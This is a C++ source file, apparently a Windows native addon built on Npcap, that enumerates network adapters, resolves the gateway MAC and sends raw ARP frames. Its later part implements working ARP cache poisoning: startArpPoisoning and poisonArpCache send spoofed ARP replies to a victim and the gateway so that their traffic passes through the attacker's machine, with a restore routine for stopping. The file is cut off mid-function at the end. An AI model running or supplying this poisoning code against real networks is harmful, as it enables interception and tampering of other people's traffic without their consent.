#include "arp.h"
#include <chrono>
#include <iostream>
#include <sstream>
#include <iomanip>
#include <algorithm>
#include <codecvt>
#include <locale>

// Helper function to convert wide string to string
static std::string WideStringToString(const std::wstring& wstr) {
    if (wstr.empty()) return std::string();
    
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
    std::string strTo(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
    return strTo;
}

// Helper function to convert PWCHAR to string
static std::string PWCHARToString(PWCHAR pwchar) {
    if (!pwchar) return std::string();
    return WideStringToString(std::wstring(pwchar));
}

// Global ARP manager instance
std::unique_ptr<ArpManager> g_arp_manager;

// ARP Manager Implementation
ArpManager::ArpManager() : pcap_handle(nullptr), is_initialized(false), poisoning_active(false) {
    initializeBuffers();
    resetPerformanceStats();
}

ArpManager::~ArpManager() {
    cleanup();
}

bool ArpManager::initialize(const std::string& adapter_name) {
    if (is_initialized) {
        cleanup();
    }
    
    auto start_time = std::chrono::high_resolution_clock::now();
    printf("ARP Manager: Starting initialization for adapter '%s'\n", adapter_name.c_str());
    
    // Validate adapter name
    if (!validateAdapter(adapter_name)) {
        setError("Invalid adapter name: " + adapter_name);
        printf("ARP Manager: ERROR - Adapter validation failed for '%s'\n", adapter_name.c_str());
        return false;
    }
    printf("ARP Manager: Adapter validation successful\n");
    
    // Map Windows adapter name to Npcap device name (Phase 2 enhancement)
    std::string pcap_device_name = mapAdapterNameToPcap(adapter_name);
    if (pcap_device_name.empty()) {
        printf("ARP Manager: Warning - Could not map adapter '%s' to pcap device name\n", adapter_name.c_str());
        printf("ARP Manager: Attempting direct connection (legacy Phase 1 mode)\n");
        pcap_device_name = adapter_name;
    } else {
        printf("ARP Manager: Mapped adapter '%s' to pcap device '%s'\n", adapter_name.c_str(), pcap_device_name.c_str());
    }
    
    // Open adapter for packet capture
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_handle = pcap_open_live(pcap_device_name.c_str(), 65536, 1, 1000, errbuf);
    
    if (pcap_handle == nullptr) {
        printf("ARP Manager: ERROR - Failed to open pcap adapter '%s': %s\n", pcap_device_name.c_str(), errbuf);
        if (pcap_device_name != adapter_name) {
            printf("ARP Manager: ERROR - Phase 2 adapter mapping failed - this indicates Npcap configuration issues\n");
        } else {
            printf("ARP Manager: ERROR - This is expected in Phase 1 - pcap requires device names like \\Device\\NPF_{GUID}\n");
        }
        pcap_handle = nullptr; // Set to null to indicate no pcap
        // Continue with initialization for fallback topology discovery
    } else {
        printf("ARP Manager: Successfully opened pcap device '%s'\n", pcap_device_name.c_str());
    }
    
    // Set non-blocking mode for performance (only if pcap is available)
    if (pcap_handle && pcap_setnonblock(pcap_handle, 1, errbuf) == -1) {
        printf("ARP Manager: ERROR - Failed to set non-blocking mode: %s (continuing for Phase 1 testing)\n", errbuf);
        // Continue anyway for Phase 1 testing
    }
    
    // Discover network topology
    printf("ARP Manager: Discovering network topology...\n");
    network_info = discoverNetworkTopology(adapter_name);
    if (!network_info.is_valid) {
        printf("ARP Manager: ERROR - Network topology discovery failed for '%s', trying alternative method\n", adapter_name.c_str());
        // Try alternative topology discovery using Windows IP Helper API
        network_info = discoverNetworkTopologyAlternative();
        if (!network_info.is_valid) {
            setError("Failed to discover network topology using any method");
            printf("ARP Manager: ERROR - Alternative topology discovery also failed\n");
            cleanup();
            return false;
        }
    }
    
    // Ensure gateway MAC is resolved - Step 3 requirement
    printf("ARP Manager: Checking gateway MAC resolution...\n");
    if (network_info.gateway_mac.empty() || network_info.gateway_mac == "00:00:00:00:00:00") {
        printf("ARP Manager: Gateway MAC not resolved, attempting discovery with retries...\n");
        
        // Retry gateway MAC discovery up to 3 times with increasing wait times
        for (int retry = 0; retry < 3 && (network_info.gateway_mac.empty() || network_info.gateway_mac == "00:00:00:00:00:00"); retry++) {
            printf("ARP Manager: Gateway MAC discovery attempt %d/3\n", retry + 1);
            
            std::string discovered_mac = discoverGatewayMac(network_info.gateway_ip);
            if (!discovered_mac.empty() && discovered_mac != "00:00:00:00:00:00") {
                network_info.gateway_mac = discovered_mac;
                printf("ARP Manager: Gateway MAC successfully resolved: %s\n", discovered_mac.c_str());
                break;
            }
            
            // Wait progressively longer between retries (500ms, 1000ms, 2000ms)
            int wait_time = 500 * (retry + 1);
            printf("ARP Manager: Gateway MAC not found, waiting %dms before retry...\n", wait_time);
            Sleep(wait_time);
        }
        
        if (network_info.gateway_mac.empty() || network_info.gateway_mac == "00:00:00:00:00:00") {
            printf("ARP Manager: WARNING - Gateway MAC could not be resolved after retries. This may affect ARP poisoning functionality.\n");
            // Continue initialization - gateway MAC can be resolved later
        }
    } else {
        printf("ARP Manager: Gateway MAC already resolved: %s\n", network_info.gateway_mac.c_str());
    }
    
    is_initialized = true;
    
    auto end_time = std::chrono::high_resolution_clock::now();
    auto duration = std::chrono::duration_cast<std::chrono::microseconds>(end_time - start_time);
    
    // Log initialization performance
    char debug_msg[256];
    sprintf_s(debug_msg, sizeof(debug_msg), "ARP Manager initialized successfully in %lld microseconds\n", duration.count());
    OutputDebugStringA(debug_msg);
    printf("ARP Manager: Initialization completed successfully\n");
    
    return true;
}

void ArpManager::cleanup() {
    if (pcap_handle) {
        pcap_close(pcap_handle);
        pcap_handle = nullptr;
    }
    is_initialized = false;
}

std::vector<NetworkAdapter> ArpManager::enumerateAdapters() {
    std::vector<NetworkAdapter> adapters;
    
    // Get all network adapters using GetAdaptersAddresses
    ULONG bufferSize = 0;
    DWORD result = GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_PREFIX, nullptr, nullptr, &bufferSize);
    
    if (result == ERROR_BUFFER_OVERFLOW) {
        auto buffer = std::make_unique<char[]>(bufferSize);
        PIP_ADAPTER_ADDRESSES adapterAddresses = reinterpret_cast<PIP_ADAPTER_ADDRESSES>(buffer.get());
        
        result = GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_PREFIX, nullptr, adapterAddresses, &bufferSize);
        
        if (result == NO_ERROR) {
            for (PIP_ADAPTER_ADDRESSES adapter = adapterAddresses; adapter != nullptr; adapter = adapter->Next) {
                // Skip loopback adapters only - include all others regardless of status
                if (adapter->IfType == IF_TYPE_SOFTWARE_LOOPBACK) {
                    continue;
                }
                
                NetworkAdapter netAdapter;
                netAdapter.name = adapter->AdapterName;
                netAdapter.pcap_name = mapAdapterNameToPcap(adapter->AdapterName);
                netAdapter.description = PWCHARToString(adapter->Description);
                netAdapter.friendly_name = PWCHARToString(adapter->FriendlyName);
                netAdapter.is_active = (adapter->OperStatus == IfOperStatusUp);
                netAdapter.is_wireless = (adapter->IfType == IF_TYPE_IEEE80211);
                
                // Get MAC address
                if (adapter->PhysicalAddressLength == 6) {
                    netAdapter.mac_address = macToString(adapter->PhysicalAddress);
                } else {
                    netAdapter.mac_address = "00:00:00:00:00:00"; // Default for adapters without MAC
                }
                
                // Get IP address
                for (PIP_ADAPTER_UNICAST_ADDRESS unicastAddress = adapter->FirstUnicastAddress;
                     unicastAddress != nullptr; unicastAddress = unicastAddress->Next) {
                    
                    if (unicastAddress->Address.lpSockaddr->sa_family == AF_INET) {
                        sockaddr_in* sockaddr_ipv4 = reinterpret_cast<sockaddr_in*>(unicastAddress->Address.lpSockaddr);
                        char ip_str[INET_ADDRSTRLEN];
                        inet_ntop(AF_INET, &sockaddr_ipv4->sin_addr, ip_str, INET_ADDRSTRLEN);
                        netAdapter.ip_address = std::string(ip_str);
                        
                        // Calculate subnet mask from prefix length
                        uint32_t mask = 0xFFFFFFFF << (32 - unicastAddress->OnLinkPrefixLength);
                        mask = htonl(mask);
                        struct in_addr mask_addr;
                        mask_addr.s_addr = mask;
                        char mask_str[INET_ADDRSTRLEN];
                        inet_ntop(AF_INET, &mask_addr, mask_str, INET_ADDRSTRLEN);
                        netAdapter.subnet_mask = std::string(mask_str);
                        break;
                    }
                }
                
                // Get gateway
                for (PIP_ADAPTER_GATEWAY_ADDRESS gatewayAddress = adapter->FirstGatewayAddress;
                     gatewayAddress != nullptr; gatewayAddress = gatewayAddress->Next) {
                    
                    if (gatewayAddress->Address.lpSockaddr->sa_family == AF_INET) {
                        sockaddr_in* sockaddr_ipv4 = reinterpret_cast<sockaddr_in*>(gatewayAddress->Address.lpSockaddr);
                        char ip_str[INET_ADDRSTRLEN];
                        inet_ntop(AF_INET, &sockaddr_ipv4->sin_addr, ip_str, INET_ADDRSTRLEN);
                        netAdapter.gateway = std::string(ip_str);
                        break;
                    }
                }
                
                adapters.push_back(netAdapter);
            }
        }
    }
    
    return adapters;
}

NetworkInfo ArpManager::discoverNetworkTopology(const std::string& adapter_name) {
    NetworkInfo info = {};
    
    // Get adapter information
    auto adapters = enumerateAdapters();
    auto it = std::find_if(adapters.begin(), adapters.end(), 
        [&adapter_name](const NetworkAdapter& adapter) {
            return adapter.name == adapter_name;
        });
    
    if (it == adapters.end()) {
        setError("Adapter not found: " + adapter_name);
        return info;
    }
    
    const NetworkAdapter& adapter = *it;
    
    // Fill network info
    info.local_ip = adapter.ip_address;
    info.subnet_mask = adapter.subnet_mask;
    info.gateway_ip = adapter.gateway;
    info.interface_name = adapter.name;
    info.interface_mac = adapter.mac_address;
    
    // Calculate CIDR
    struct in_addr mask_addr;
    inet_pton(AF_INET, adapter.subnet_mask.c_str(), &mask_addr);
    uint32_t mask = mask_addr.s_addr;
    info.subnet_cidr = 0;
    while (mask & 0x80000000) {
        info.subnet_cidr++;
        mask <<= 1;
    }
    
    // Discover gateway MAC address (with timeout for performance)
    if (!adapter.gateway.empty() && adapter.gateway != "0.0.0.0") {
        info.gateway_mac = discoverGatewayMac(adapter.gateway);
    }
    
    // Consider topology valid even without gateway MAC (can be discovered later)
    info.is_valid = !info.local_ip.empty() && !info.gateway_ip.empty();
    
    return info;
}

bool ArpManager::sendArpRequest(const std::string& target_ip) {
    if (!is_initialized) {
        setError("ARP Manager not initialized");
        return false;
    }
    
    auto start_time = std::chrono::high_resolution_clock::now();
    
    // Parse target IP
    uint8_t target_ip_bytes[4];
    if (!stringToIp(target_ip, target_ip_bytes)) {
        setError("Invalid target IP address: " + target_ip);
        return false;
    }
    
    // Parse local IP and MAC
    uint8_t local_ip_bytes[4];
    uint8_t local_mac_bytes[6];
    if (!stringToIp(network_info.local_ip, local_ip_bytes) ||
        !stringToMac(network_info.interface_mac, local_mac_bytes)) {
        setError("Invalid local network configuration");
        return false;
    }
    
    // Prepare ARP request frame
    ArpFrame* frame = reinterpret_cast<ArpFrame*>(arp_buffer.data());
    memset(frame, 0, sizeof(ArpFrame));
    
    // Ethernet header
    memset(frame->eth.dest_mac, 0xFF, 6); // Broadcast MAC
    memcpy(frame->eth.src_mac, local_mac_bytes, 6);
    frame->eth.ethertype = htons(0x0806); // ARP
    
    // ARP packet
    frame->arp.hardware_type = htons(1);    // Ethernet
    frame->arp.protocol_type = htons(0x0800); // IPv4
    frame->arp.hardware_len = 6;
    frame->arp.protocol_len = 4;
    frame->arp.operation = htons(1);        // Request
    memcpy(frame->arp.sender_mac, local_mac_bytes, 6);
    memcpy(frame->arp.sender_ip, local_ip_bytes, 4);
    memset(frame->arp.target_mac, 0, 6);    // Unknown
    memcpy(frame->arp.target_ip, target_ip_bytes, 4);
    
    // Send packet (check if pcap_handle is available)
    int result = -1;
    if (pcap_handle) {
        result = pcap_sendpacket(pcap_handle, arp_buffer.data(), sizeof(ArpFrame));
    } else {
        setError("Pcap handle not available - ensure proper adapter initialization");
    }
    
    auto end_time = std::chrono::high_resolution_clock::now();
    auto duration = std::chrono::duration_cast<std::chrono::microseconds>(end_time - start_time);
    
    bool success = (result == 0);
    updatePerformanceStats(true, duration.count() / 1000.0, success);
    
    if (!success) {
        setError("Failed to send ARP request: " + std::string(pcap_geterr(pcap_handle)));
    }
    
    return success;
}

bool ArpManager::sendArpReply(const std::string& sender_ip, const std::string& target_ip, 
                             const std::string& sender_mac, const std::string& target_mac) {
    if (!is_initialized) {
        setError("ARP Manager not initialized");
        return false;
    }
    
    auto start_time = std::chrono::high_resolution_clock::now();
    
    // Parse parameters
    uint8_t sender_ip_bytes[4], target_ip_bytes[4];
    uint8_t sender_mac_bytes[6], target_mac_bytes[6];
    
    if (!stringToIp(sender_ip, sender_ip_bytes) ||
        !stringToIp(target_ip, target_ip_bytes) ||
        !stringToMac(sender_mac, sender_mac_bytes) ||
        !stringToMac(target_mac, target_mac_bytes)) {
        setError("Invalid parameters for ARP reply");
        return false;
    }
    
    // Prepare ARP reply frame
    ArpFrame* frame = reinterpret_cast<ArpFrame*>(arp_buffer.data());
    memset(frame, 0, sizeof(ArpFrame));
    
    // Ethernet header
    memcpy(frame->eth.dest_mac, target_mac_bytes, 6);
    memcpy(frame->eth.src_mac, sender_mac_bytes, 6);
    frame->eth.ethertype = htons(0x0806); // ARP
    
    // ARP packet
    frame->arp.hardware_type = htons(1);    // Ethernet
    frame->arp.protocol_type = htons(0x0800); // IPv4
    frame->arp.hardware_len = 6;
    frame->arp.protocol_len = 4;
    frame->arp.operation = htons(2);        // Reply
    memcpy(frame->arp.sender_mac, sender_mac_bytes, 6);
    memcpy(frame->arp.sender_ip, sender_ip_bytes, 4);
    memcpy(frame->arp.target_mac, target_mac_bytes, 6);
    memcpy(frame->arp.target_ip, target_ip_bytes, 4);
    
    // Send packet (check if pcap_handle is available)
    int result = -1;
    if (pcap_handle) {
        result = pcap_sendpacket(pcap_handle, arp_buffer.data(), sizeof(ArpFrame));
    } else {
        setError("Pcap handle not available - ensure proper adapter initialization");
    }
    
    auto end_time = std::chrono::high_resolution_clock::now();
    auto duration = std::chrono::duration_cast<std::chrono::microseconds>(end_time - start_time);
    
    bool success = (result == 0);
    updatePerformanceStats(true, duration.count() / 1000.0, success);
    
    if (!success && pcap_handle) {
        setError("Failed to send ARP reply: " + std::string(pcap_geterr(pcap_handle)));
    }
    
    return success;
}

std::string ArpManager::discoverGatewayMac(const std::string& gateway_ip) {
    printf("ARP Manager: Attempting to discover MAC for gateway %s...\n", gateway_ip.c_str());
    
    // Try to find gateway MAC in ARP table first
    ULONG bufferSize = 0;
    DWORD result = GetIpNetTable(nullptr, &bufferSize, FALSE);
    
    if (result == ERROR_INSUFFICIENT_BUFFER) {
        auto buffer = std::make_unique<char[]>(bufferSize);
        PMIB_IPNETTABLE pIpNetTable = reinterpret_cast<PMIB_IPNETTABLE>(buffer.get());
        
        result = GetIpNetTable(pIpNetTable, &bufferSize, FALSE);
        
        if (result == NO_ERROR) {
            struct in_addr gateway_addr;
            if (inet_pton(AF_INET, gateway_ip.c_str(), &gateway_addr) != 1) {
                printf("ARP Manager: ERROR - Invalid gateway IP address format: %s\n", gateway_ip.c_str());
                return "";
            }
            
            for (DWORD i = 0; i < pIpNetTable->dwNumEntries; i++) {
                if (pIpNetTable->table[i].dwAddr == gateway_addr.s_addr) {
                    std::string found_mac = macToString(pIpNetTable->table[i].bPhysAddr);
                    printf("ARP Manager: Found gateway MAC in ARP table: %s\n", found_mac.c_str());
                    return found_mac;
                }
            }
            printf("ARP Manager: Gateway MAC not found in ARP table (%d entries checked)\n", pIpNetTable->dwNumEntries);
        } else {
            printf("ARP Manager: ERROR - Failed to get ARP table: %lu\n", result);
        }
    } else {
        printf("ARP Manager: ERROR - Failed to get ARP table buffer size: %lu\n", result);
    }
    
    // If not found in ARP table and we have pcap handle, try ARP request
    if (pcap_handle) {
        printf("ARP Manager: Sending ARP request to discover gateway MAC...\n");
        if (sendArpRequest(gateway_ip)) {
            // Wait briefly for response and check ARP table again (avoid recursion)
            printf("ARP Manager: Waiting for ARP response...\n");
            Sleep(500);
            
            // Re-query buffer size as it may have changed
            bufferSize = 0;
            result = GetIpNetTable(nullptr, &bufferSize, FALSE);
            
            if (result == ERROR_INSUFFICIENT_BUFFER) {
                auto buffer = std::make_unique<char[]>(bufferSize);
                PMIB_IPNETTABLE pIpNetTable = reinterpret_cast<PMIB_IPNETTABLE>(buffer.get());
                
                result = GetIpNetTable(pIpNetTable, &bufferSize, FALSE);
                
                if (result == NO_ERROR) {
                    struct in_addr gateway_addr;
                    inet_pton(AF_INET, gateway_ip.c_str(), &gateway_addr);
                    
                    for (DWORD i = 0; i < pIpNetTable->dwNumEntries; i++) {
                        if (pIpNetTable->table[i].dwAddr == gateway_addr.s_addr) {
                            std::string found_mac = macToString(pIpNetTable->table[i].bPhysAddr);
                            printf("ARP Manager: Gateway MAC discovered via ARP request: %s\n", found_mac.c_str());
                            return found_mac;
                        }
                    }
                } else {
                    printf("ARP Manager: ERROR - Failed to re-query ARP table after request: %lu\n", result);
                }
            }
        } else {
            printf("ARP Manager: ERROR - Failed to send ARP request for gateway discovery\n");
        }
    } else {
        printf("ARP Manager: WARNING - No pcap handle available for active ARP discovery\n");
    }
    
    // Return empty string if not found - this is acceptable
    printf("ARP Manager: Gateway MAC discovery failed - returning empty\n");
    return "";
}

bool ArpManager::refreshGatewayMac() {
    if (!is_initialized || network_info.gateway_ip.empty()) {
        return false;
    }
    
    std::string new_gateway_mac = discoverGatewayMac(network_info.gateway_ip);
    if (!new_gateway_mac.empty() && new_gateway_mac != "00:00:00:00:00:00") {
        network_info.gateway_mac = new_gateway_mac;
        printf("ARP Manager: Gateway MAC refreshed - %s (%s)\n", 
               network_info.gateway_ip.c_str(), network_info.gateway_mac.c_str());
        return true;
    }
    
    return false;
}

// Utility functions
std::string ArpManager::macToString(const uint8_t* mac) {
    std::stringstream ss;
    for (int i = 0; i < 6; ++i) {
        if (i > 0) ss << ":";
        ss << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(mac[i]);
    }
    return ss.str();
}

bool ArpManager::stringToMac(const std::string& mac_str, uint8_t* mac) {
    if (mac_str.length() != 17) return false;
    
    for (int i = 0; i < 6; ++i) {
        std::string byte_str = mac_str.substr(i * 3, 2);
        try {
            mac[i] = static_cast<uint8_t>(std::stoi(byte_str, nullptr, 16));
        } catch (...) {
            return false;
        }
    }
    return true;
}

bool ArpManager::stringToIp(const std::string& ip_str, uint8_t* ip) {
    struct in_addr addr;
    if (inet_pton(AF_INET, ip_str.c_str(), &addr) != 1) {
        return false;
    }
    
    memcpy(ip, &addr, 4);
    return true;
}

std::string ArpManager::ipToString(const uint8_t* ip) {
    return std::to_string(ip[0]) + "." + std::to_string(ip[1]) + "." + 
           std::to_string(ip[2]) + "." + std::to_string(ip[3]);
}

ArpManager::PerformanceStats ArpManager::getPerformanceStats() const {
    return perf_stats;
}

void ArpManager::resetPerformanceStats() {
    memset(&perf_stats, 0, sizeof(perf_stats));
}

// Alternative network topology discovery using Windows IP Helper API
NetworkInfo ArpManager::discoverNetworkTopologyAlternative() {
    NetworkInfo info;
    info.is_valid = false;
    
    // Get all adapter addresses to find active adapter with gateway
    ULONG bufferSize = 0;
    DWORD result = GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_GATEWAYS | GAA_FLAG_INCLUDE_PREFIX, 
                                       nullptr, nullptr, &bufferSize);
    
    if (result == ERROR_BUFFER_OVERFLOW) {
        auto buffer = std::make_unique<char[]>(bufferSize);
        PIP_ADAPTER_ADDRESSES adapterAddresses = reinterpret_cast<PIP_ADAPTER_ADDRESSES>(buffer.get());
        
        result = GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_GATEWAYS | GAA_FLAG_INCLUDE_PREFIX,
                                     nullptr, adapterAddresses, &bufferSize);
        
        if (result == NO_ERROR) {
            // Find the first active adapter with a gateway
            for (PIP_ADAPTER_ADDRESSES adapter = adapterAddresses; adapter; adapter = adapter->Next) {
                if (adapter->OperStatus == IfOperStatusUp && 
                    adapter->FirstUnicastAddress && 
                    adapter->FirstGatewayAddress) {
                    
                    // Get local IP
                    auto unicast = adapter->FirstUnicastAddress;
                    if (unicast->Address.lpSockaddr->sa_family == AF_INET) {
                        auto sockaddr_ipv4 = reinterpret_cast<sockaddr_in*>(unicast->Address.lpSockaddr);
                        char ip_str[INET_ADDRSTRLEN];
                        inet_ntop(AF_INET, &sockaddr_ipv4->sin_addr, ip_str, INET_ADDRSTRLEN);
                        info.local_ip = std::string(ip_str);
                        
                        // Calculate subnet info from prefix
                        UINT8 prefixLength = unicast->OnLinkPrefixLength;
                        info.subnet_cidr = prefixLength;
                        
                        // Calculate subnet mask
                        uint32_t mask = 0xFFFFFFFF << (32 - prefixLength);
                        struct in_addr mask_addr;
                        mask_addr.s_addr = htonl(mask);
                        char mask_str[INET_ADDRSTRLEN];
                        inet_ntop(AF_INET, &mask_addr, mask_str, INET_ADDRSTRLEN);
                        info.subnet_mask = std::string(mask_str);
                    }
                    
                    // Get gateway IP
                    auto gateway = adapter->FirstGatewayAddress;
                    if (gateway->Address.lpSockaddr->sa_family == AF_INET) {
                        auto gateway_sockaddr = reinterpret_cast<sockaddr_in*>(gateway->Address.lpSockaddr);
                        char gateway_str[INET_ADDRSTRLEN];
                        inet_ntop(AF_INET, &gateway_sockaddr->sin_addr, gateway_str, INET_ADDRSTRLEN);
                        info.gateway_ip = std::string(gateway_str);
                    }
                    
                    // Get interface MAC address
                    if (adapter->PhysicalAddressLength == 6) {
                        char mac_str[18];
                        snprintf(mac_str, sizeof(mac_str), "%02x:%02x:%02x:%02x:%02x:%02x",
                                adapter->PhysicalAddress[0], adapter->PhysicalAddress[1],
                                adapter->PhysicalAddress[2], adapter->PhysicalAddress[3],
                                adapter->PhysicalAddress[4], adapter->PhysicalAddress[5]);
                        info.interface_mac = std::string(mac_str);
                    } else {
                        // Set default MAC if not available
                        info.interface_mac = "00:00:00:00:00:00";
                    }
                    
                    // Try to discover gateway MAC from ARP table (quick lookup)
                    info.gateway_mac = discoverGatewayMac(info.gateway_ip);
                    if (info.gateway_mac.empty()) {
                        info.gateway_mac = "00:00:00:00:00:00"; // Default if not found
                    }
                    
                    info.is_valid = true;
                    printf("ARP Manager: Alternative topology discovery successful - IP: %s, Gateway: %s (%s), Subnet: %s/%d\n",
                           info.local_ip.c_str(), info.gateway_ip.c_str(), info.gateway_mac.c_str(), info.subnet_mask.c_str(), info.subnet_cidr);
                    break;
                }
            }
        }
    }
    
    if (!info.is_valid) {
        printf("ARP Manager: Alternative topology discovery failed\n");
    }
    
    return info;
}

void ArpManager::setError(const std::string& error) {
    last_error = error;
    OutputDebugStringA(("ARP Manager Error: " + error + "\n").c_str());
}

bool ArpManager::validateAdapter(const std::string& adapter_name) {
    auto adapters = enumerateAdapters();
    return std::find_if(adapters.begin(), adapters.end(), 
        [&adapter_name](const NetworkAdapter& adapter) {
            return adapter.name == adapter_name;
        }) != adapters.end();
}

void ArpManager::initializeBuffers() {
    arp_buffer.resize(sizeof(ArpFrame));
    arp_frame = reinterpret_cast<ArpFrame*>(arp_buffer.data());
}

void ArpManager::updatePerformanceStats(bool is_send, double time_ms, bool success) {
    if (is_send) {
        perf_stats.packets_sent++;
        if (!success) perf_stats.send_errors++;
        perf_stats.avg_send_time_ms = (perf_stats.avg_send_time_ms + time_ms) / 2.0;
    } else {
        perf_stats.packets_received++;
        if (!success) perf_stats.receive_errors++;
        perf_stats.avg_receive_time_ms = (perf_stats.avg_receive_time_ms + time_ms) / 2.0;
    }
}

// Phase 2: Adapter name mapping implementation
std::string ArpManager::mapAdapterNameToPcap(const std::string& windows_adapter_name) {
    // Get all pcap devices
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_if_t* alldevs;
    pcap_if_t* device;
    
    if (pcap_findalldevs(&alldevs, errbuf) == -1) {
        printf("ARP Manager: Failed to enumerate pcap devices: %s\n", errbuf);
        return "";
    }
    
    std::string pcap_name;
    
    // Look for device that matches our adapter name
    for (device = alldevs; device != nullptr; device = device->next) {
        std::string device_name = device->name;
        
        // Npcap device names follow pattern: \Device\NPF_{GUID}
        // Windows adapter names are just the GUID: {GUID}
        if (device_name.find("\\Device\\NPF_") == 0) {
            // Extract GUID from pcap device name
            size_t guid_start = device_name.find_last_of('_') + 1;
            if (guid_start != std::string::npos) {
                std::string device_guid = device_name.substr(guid_start);
                
                // Check if this GUID matches our adapter name
                if (windows_adapter_name.find(device_guid) != std::string::npos ||
                    device_guid.find(windows_adapter_name) != std::string::npos) {
                    pcap_name = device_name;
                    printf("ARP Manager: Found matching pcap device - GUID: %s -> Device: %s\n", 
                           device_guid.c_str(), device_name.c_str());
                    break;
                }
            }
        }
    }
    
    pcap_freealldevs(alldevs);
    
    if (pcap_name.empty()) {
        printf("ARP Manager: No matching pcap device found for adapter: %s\n", windows_adapter_name.c_str());
    }
    
    return pcap_name;
}

std::vector<std::string> ArpManager::enumeratePcapDevices() {
    std::vector<std::string> devices;
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_if_t* alldevs;
    pcap_if_t* device;
    
    if (pcap_findalldevs(&alldevs, errbuf) == -1) {
        printf("ARP Manager: Failed to enumerate pcap devices: %s\n", errbuf);
        return devices;
    }
    
    for (device = alldevs; device != nullptr; device = device->next) {
        devices.push_back(device->name);
        printf("ARP Manager: Found pcap device: %s", device->name);
        if (device->description) {
            printf(" (%s)", device->description);
        }
        printf("\n");
    }
    
    pcap_freealldevs(alldevs);
    return devices;
}

// Phase 2: ARP poisoning implementation
bool ArpManager::startArpPoisoning(const std::string& target_ip, const std::string& target_mac) {
    if (!is_initialized || !pcap_handle) {
        setError("ARP Manager not properly initialized for poisoning operations");
        return false;
    }
    
    // Ensure we have gateway MAC for poisoning - refresh if needed
    if (network_info.gateway_mac.empty() || network_info.gateway_mac == "00:00:00:00:00:00") {
        printf("ARP Manager: Gateway MAC not available, attempting to refresh...\n");
        refreshGatewayMac();
    }
    
    // Check if target is already being poisoned
    for (const auto& target : poisoning_targets) {
        if (target.ip == target_ip && target.is_active) {
            printf("ARP Manager: Target %s is already being poisoned\n", target_ip.c_str());
            return true;
        }
    }
    
    // Add target to poisoning list
    PoisoningTarget new_target;
    new_target.ip = target_ip;
    new_target.mac = target_mac;
    new_target.is_active = true;
    poisoning_targets.push_back(new_target);
    
    poisoning_active = true;
    
    printf("ARP Manager: Started ARP poisoning for target %s (%s)\n", target_ip.c_str(), target_mac.c_str());
    
    // Immediately send initial poisoning packets
    return poisonArpCache(target_ip, target_mac, network_info.gateway_ip, network_info.interface_mac) &&
           poisonArpCache(network_info.gateway_ip, network_info.gateway_mac, target_ip, network_info.interface_mac);
}

bool ArpManager::stopArpPoisoning(const std::string& target_ip) {
    bool found = false;
    
    for (auto& target : poisoning_targets) {
        if (target.ip == target_ip && target.is_active) {
            target.is_active = false;
            found = true;
            
            // Restore legitimate ARP entries
            printf("ARP Manager: Restoring legitimate ARP entries for %s\n", target_ip.c_str());
            
            // Send legitimate ARP replies to restore normal connectivity
            poisonArpCache(target_ip, target.mac, network_info.gateway_ip, network_info.gateway_mac);
            poisonArpCache(network_info.gateway_ip, network_info.gateway_mac, target_ip, target.mac);
            
            break;
        }
    }
    
    // Check if any targets are still active
    bool any_active = false;
    for (const auto& target : poisoning_targets) {
        if (target.is_active) {
            any_active = true;
            break;
        }
    }
    
    if (!any_active) {
        poisoning_active = false;
        printf("ARP Manager: All ARP poisoning stopped\n");
    }
    
    return found;
}

bool ArpManager::poisonArpCache(const std::string& victim_ip, const std::string& victim_mac, 
                               const std::string& spoof_ip, const std::string& our_mac) {
    if (!is_initialized || !pcap_handle) {
        setError("ARP Manager not properly initialized for poisoning operations");
        return false;
    }
    
    auto start_time = std::chrono::high_resolution_clock::now();
    
    // Parse parameters
    uint8_t victim_ip_bytes[4], spoof_ip_bytes[4];
    uint8_t victim_mac_bytes[6], our_mac_bytes[6];
    
    if (!stringToIp(victim_ip, victim_ip_bytes) ||
        !stringToIp(spoof_ip, spoof_ip_bytes) ||
        !stringToMac(victim_mac, victim_mac_bytes) ||
        !stringToMac(our_mac, our_mac_bytes)) {
        setError("Invalid parameters for ARP poisoning");
        return false;
    }
    
    // Prepare ARP poisoning frame (spoofed reply)
    ArpFrame* frame = reinterpret_cast<ArpFrame*>(arp_buffer.data());
    memset(frame, 0, sizeof(ArpFrame));
    
    // Ethernet header - send directly to victim
    memcpy(frame->eth.dest_mac, victim_mac_bytes, 6);
    memcpy(frame->eth.src_mac, our_mac_bytes, 6);
    frame->eth.ethertype = htons(0x0806); // ARP
    
    // ARP packet - claim we are the spoofed IP
    frame->arp.hardware_type = htons(1);    // Ethernet
    frame->arp.protocol_type = htons(0x0800); // IPv4
    frame->arp.hardware_len = 6;
    frame->arp.protocol_len = 4;
    frame->arp.operation = htons(2);        // Reply (unsolicited)
    memcpy(frame->arp.sender_mac, our_mac_bytes, 6);      // Our MAC
    memcpy(frame->arp.sender_ip, spoof_ip_bytes, 4);      // IP we're spoofing
    memcpy(frame->arp.target_mac, victim_mac_bytes, 6);   // Victim's MAC
    memcpy(frame->arp.target_ip, victim_ip_bytes, 4);     // Victim's IP
    
    // Send poisoning packet
    int result = pcap_sendpacket(pcap_handle, arp_buffer.data(), sizeof(ArpFrame));
    
    auto end_time = std::chrono::high_resolution_clock::now();
    auto duration = std::chrono::duration_cast<std::chrono::microseconds>(end_time - start_time);
    
    bool success = (result == 0);
    updatePerformanceStats(true, duration.count() / 1000.0, success);
    
    if (!success) {
        setError("Failed to send ARP poisoning packet: " + std::string(pcap_geterr(pcap_handle)));
    } else {
        printf("ARP Manager: Poisoned %s -> told %s that %s is at %s\n", 
               victim_ip.c_str(), victim_ip.c_str(), spoof_ip.c_str(), our_mac.c_str());
    }
    
    return success;
}

// C++ function implementations for N-API exports
std::vector<NetworkAdapter> GetNetworkAdapters() {
    if (!g_arp_manager) {
        g_arp_manager = std::make_unique<ArpManager>();
    }
    return g_arp_manager->enumerateAdapters();
}

bool InitializeArpManager(const std::string& adapter_name) {
